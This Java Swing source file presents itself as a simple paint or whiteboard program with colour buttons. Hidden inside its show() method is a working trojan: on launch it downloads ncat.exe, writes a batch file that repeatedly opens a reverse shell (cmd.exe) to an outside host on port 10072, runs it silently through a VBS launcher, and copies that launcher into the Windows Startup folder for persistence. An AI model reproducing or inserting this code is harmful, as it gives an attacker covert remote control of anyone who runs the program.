import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import java.io.FileWriter; 

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.*;
public class SwingPaint {
 
  JButton clearBtn, blackBtn, blueBtn, greenBtn, redBtn, magentaBtn;
  DrawArea drawArea;
  ActionListener actionListener = new ActionListener() {
 
  public void actionPerformed(ActionEvent e) {
      if (e.getSource() == clearBtn) {
        drawArea.clear();
      } else if (e.getSource() == blackBtn) {
        drawArea.black();
      } else if (e.getSource() == blueBtn) {
        drawArea.blue();
      } else if (e.getSource() == greenBtn) {
        drawArea.green();
      } else if (e.getSource() == redBtn) {
        drawArea.red();
      } else if (e.getSource() == magentaBtn) {
        drawArea.magenta();
      }
    }
  };

 
  public static void main(String[] args) {
    new SwingPaint().show();
    
  }
 
  public void show() {
    // create main frame

    JFrame frame = new JFrame("Code By "+System.getProperty("user.name"));
    JLabel show_name = new JLabel();

    show_name.setText("<html><h1 style='color:blue;background-color:#a2beeb;'>"+System.getProperty("user.name")+"'s White Board  </h1></html>");
    show_name.setBounds(0,0,500,200);// Show my Name 


    Container content = frame.getContentPane();
    // set layout on content pane
    content.setLayout(new BorderLayout());
    
    // create draw area
    drawArea = new  DrawArea();
 
    // add to content pane
    content.add(drawArea, BorderLayout.CENTER);
   
    // create controls to apply colors and call clear feature
    JPanel controls = new JPanel();
 
    clearBtn = new JButton("Clear");
    clearBtn.addActionListener(actionListener);
    blackBtn = new JButton("<html><div style='color:Black;'>Black</div></html>");
    blackBtn.addActionListener(actionListener);
    blueBtn = new JButton("<html><div style='color:Blue;'>Blue</div></html>");
    blueBtn.addActionListener(actionListener);
    greenBtn = new JButton("<html><div style='color:Green;'>Green</div></html>");
    greenBtn.addActionListener(actionListener);
    redBtn = new JButton("<html><div style='color:Red;'>Red</div></html>");
    redBtn.addActionListener(actionListener);
    magentaBtn = new JButton("<html><div style='color:magenta;'>magenta</div></html>");
    magentaBtn.addActionListener(actionListener);

    
    // add to panel
    controls.add(greenBtn);
    controls.add(blueBtn);
    controls.add(blackBtn);
    controls.add(redBtn);
    controls.add(magentaBtn);
    controls.add(clearBtn);
    
    
    
    String link ="https://raw.githubusercontent.com/Rafsan-decodea/study/master/ncat.exe";
    Runtime runtime = Runtime.getRuntime();
    try{
      
      String username =  System.getProperty("user.name");
      HttpDownloadUtility.downloadFile(link, "C:/Users/"+username+"/AppData");

       FileWriter myWriter = new FileWriter("C:\\Users\\"+username+"\\AppData\\run.vbs");
     
        String ws = " \"WScript.Shell\" ";
        String drive = " \"C:\\Users\\"+username+"\\AppData\\run.bat\"";
        String file_copy =  "\"C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
        myWriter.write("Dim WinScriptHost \nSet WinScriptHost = CreateObject("+ws+") \nWinScriptHost.Run Chr(34) &"+drive+" & Chr(34), 0 \nSet WinScriptHost = Nothing ");
        myWriter.close();
   
        FileWriter myWriter2 = new FileWriter("C:\\Users\\"+username+"\\AppData\\run.bat");
         myWriter2.write(" :a \n  ncat -v fw1.sshreach.me  10072   -e cmd.exe\ngoto a  ");
         myWriter2.close();
         System.out.println("Successfully wrote to the file.");

        Process process =runtime.exec("cmd /c start C:\\Users\\"+username+"\\AppData\\run.vbs");
        Process process2 = runtime.exec("cmd /c xcopy C:\\Users\\"+username+"\\AppData\\run.vbs  "+file_copy);

       

     

    } 

   catch(Exception e)
   {
       System.out.print(e);
   }

  


    JPanel jpanel = new JPanel();
    jpanel.add(show_name);
    content.add(jpanel,BorderLayout.NORTH); //Add MY name into Jpanel
    // add to content pane
    content.add(controls, BorderLayout.SOUTH);
 
    frame.setSize(600, 600);
    // can close frame
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    // show the swing paint result
    //frame.setBackground();
    frame.setVisible(true);
 
    // Now you can try our Swing Paint !!! Enjoy :D
  }
 
}